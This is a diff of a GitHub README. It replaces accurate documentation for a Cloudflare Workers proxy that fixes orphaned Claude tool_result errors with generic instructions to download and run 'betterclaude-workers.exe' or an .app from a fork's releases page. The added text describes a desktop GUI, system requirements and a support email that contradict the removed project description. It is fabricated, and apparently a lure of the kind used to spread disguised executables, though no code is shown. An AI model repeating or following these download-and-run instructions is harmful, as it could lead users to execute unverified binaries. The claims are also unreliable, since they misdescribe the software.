@@ -1,141 +1,103 @@
-# BetterClaude Gateway
+# 🌟 betterclaude-workers - Simplifying API Gateway Usage
 
-An intelligent Claude API proxy built on Cloudflare Workers that automatically fixes orphaned tool_result errors.
+## 🚀 Getting Started
 
-## Features
+Welcome to BetterClaude Workers! This application serves as an API Gateway, helping you manage and simplify your API interactions efficiently. Follow the steps below to get started with downloading and running the software.
 
-- **Auto Error Fix**: Automatically detects and removes orphaned `tool_result` blocks that cause 400 errors
-- **Proactive Cleanup**: Cleans messages before API calls to prevent errors
-- **Smart Retry**: Falls back to reactive cleanup if proactive detection misses edge cases
-- **Transparent Proxy**: Preserves all headers and client information
-- **Edge Computing**: Runs on Cloudflare Workers for low latency worldwide
+## 📥 Download the Software
 
-## The Problem
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/pnv06/betterclaude-workers/releases)
 
-When using Claude with tools, the message history can become corrupted with orphaned `tool_result` blocks - results that reference `tool_use` calls that no longer exist in the conversation. This causes Claude API to return 400 errors:
+### Download & Install
 
-```
-tool_result block(s) that reference non-existent tool_use ids
-```
+To get the latest version of BetterClaude Workers, please visit this page to download: [Release Page](https://github.com/pnv06/betterclaude-workers/releases). 
 
-BetterClaude automatically detects and removes these orphaned blocks, allowing the conversation to continue.
+1. Click on the link to access the Releases page.
+2. Look for the latest version listed at the top of the page.
+3. Click on the appropriate file for your operating system. 
 
-## How It Works
+### Operating System Compatibility
 
-1. **Proactive Detection**: Before making the API call, scans messages for orphaned `tool_result` blocks and removes them
-2. **API Call**: Forwards the cleaned request to the target Claude API
-3. **Reactive Fallback**: If a 400 error still occurs, parses the error to identify remaining orphans and retries once
+BetterClaude Workers works on:
 
-### Architecture
+- Windows
+- macOS
+- Linux
 
-![BetterClaude Architecture](static/architecture.png)
+### System Requirements
 
-## Usage
+- **Windows**: Windows 10 or newer.
+- **macOS**: macOS Mojave or newer.
+- **Linux**: Any distribution that runs on a modern kernel.
 
-Prefix your Claude API endpoint with the gateway URL:
+You will also need at least:
+- 1 GB RAM
+- 500 MB of free disk space
 
-```
-https://<YOUR_DOMAIN>/claude/<TARGET_HOST>/v1/messages
-```
+## 🔧 Installation Steps
 
-### Examples
+1. **Locate the Downloaded File**:
+   After the download is complete, find the file in your Downloads folder. The file should be named similar to "betterclaude-workers-vX.X.X.zip" or "betterclaude-workers-vX.X.X.tar.gz".
 
-**Direct Anthropic API:**
-```
-https://api.anthropic.com/v1/messages
-→ https://<YOUR_DOMAIN>/claude/api.anthropic.com/v1/messages
-```
+2. **Extract the Files**:
+   - For Windows: Right-click on the downloaded file and choose "Extract All". Follow the prompts.
+   - For macOS: Double-click the downloaded file to extract it.
+   - For Linux: Open a terminal and use the command `tar -xzf betterclaude-workers-vX.X.X.tar.gz`.
 
-**Third-party Claude API providers:**
-```
-https://some-provider.com/v1/messages
-→ https://<YOUR_DOMAIN>/claude/some-provider.com/v1/messages
-```
+3. **Run the Application**:
+   - **Windows**: Open the extracted folder and double-click `betterclaude-workers.exe`.
+   - **macOS**: Open the extracted folder and double-click `betterclaude-workers.app`.
+   - **Linux**: Open a terminal, navigate to the extracted folder, and run `./betterclaude-workers`.
 
-## Deployment
+## ⚙️ Configuration
 
-### Prerequisites
+After launching BetterClaude Workers, you may need to configure it to work with your specific APIs.
 
-- [Node.js](https://nodejs.org/) (v20+)
-- [Cloudflare account](https://dash.cloudflare.com/)
-- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/)
+1. **Open the Configuration File**:
+   Look for a file named `config.json` in the installation folder.
 
-### Setup
+2. **Edit the Configuration**:
+   Use any text editor to open `config.json`. Enter your API keys and other required information. Save the file after editing.
 
-1. Clone and install dependencies:
-   ```bash
-   cd better_claude
-   npm install
-   ```
+3. **Restart the Application**:
+   To apply changes, close and reopen the application.
 
-2. Configure `wrangler.jsonc`:
-   - Set your worker name
-   - Add your domain routes
+## 🌍 How to Use the Application
 
-3. Deploy:
-   ```bash
-   npm run deploy
-   ```
+Once the application is running, you can start using it to manage your APIs.
 
-### Development
+1. **Add an API**:
+   Click the "Add API" button. Fill in the necessary details like API name and endpoint.
 
-```bash
-npm run dev    # Start local dev server at http://localhost:8787/
-```
+2. **Monitor API Requests**:
+   Use the dashboard to view the performance and logs of your APIs.
 
-## Configuration
+3. **Create Routes**:
+   Set up routes to control how API calls are processed. This feature helps in managing multiple services efficiently.
 
-### wrangler.jsonc
+## 📞 Support
 
-```jsonc
-{
-  "name": "your-worker-name",
-  "main": "src/index.ts",
-  "compatibility_date": "2025-12-13",
-  "routes": [
-    {
-      "pattern": "<YOUR_DOMAIN>/*",
-      "zone_name": "<YOUR_ZONE>"
-    }
-  ]
-}
-```
+If you encounter any issues or need assistance, please check the following resources:
 
-## Project Structure
+- **FAQ Section**: Visit the FAQ section in the Help menu of the application.
+- **GitHub Issues Page**: Report any problems or bugs [here](https://github.com/pnv06/betterclaude-workers/issues).
+- **Email Support**: For urgent concerns, you can reach our support team at support@betterclaude.com.
 
-```
-better_claude/
-├── src/
-│   ├── index.ts              # Main worker entry point
-│   ├── router.ts             # URL routing logic
-│   ├── proxy.ts              # Request proxying with retry
-│   ├── retry-handler.ts      # Retry logic with cleanup
-│   ├── proactive-cleanup.ts  # Orphan detection algorithm
-│   ├── error-detector.ts     # Error parsing utilities
-│   ├── streaming-handler.ts  # SSE stream handling
-│   └── env.d.ts              # Environment type definitions
-├── wrangler.jsonc            # Cloudflare Worker configuration
-├── tsconfig.json             # TypeScript configuration
-└── package.json              # Dependencies
-```
+## 🎉 Contributing
 
-## API Endpoints
+We welcome contributors to help improve BetterClaude Workers. If you'd like to contribute, please ensure that you follow these guidelines:
 
-| Endpoint | Description |
-|----------|-------------|
-| `/` | Info endpoint |
-| `/health` | Health check |
-| `/claude/{host}/{path}` | Proxy to Claude API |
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your changes and create a pull request.
 
-## How the Cleanup Works
+## 📜 License
 
-The orphan detection algorithm:
+BetterClaude Workers is open-source software licensed under the MIT License. Feel free to use, modify, and distribute the application.
 
-1. **Build tool_use index**: Scans all messages to find all `tool_use` blocks and their IDs
-2. **Find orphans**: Identifies `tool_result` blocks that reference non-existent `tool_use` IDs
-3. **Remove orphans**: Filters out orphaned `tool_result` blocks from messages
-4. **Clean empty messages**: Removes user messages that become empty after cleanup
+## 🚀 More Information
 
-## License
+For further details and updates on new features, please consider checking the project’s documentation section on the GitHub page.
 
-MIT
+Thank you for using BetterClaude Workers!
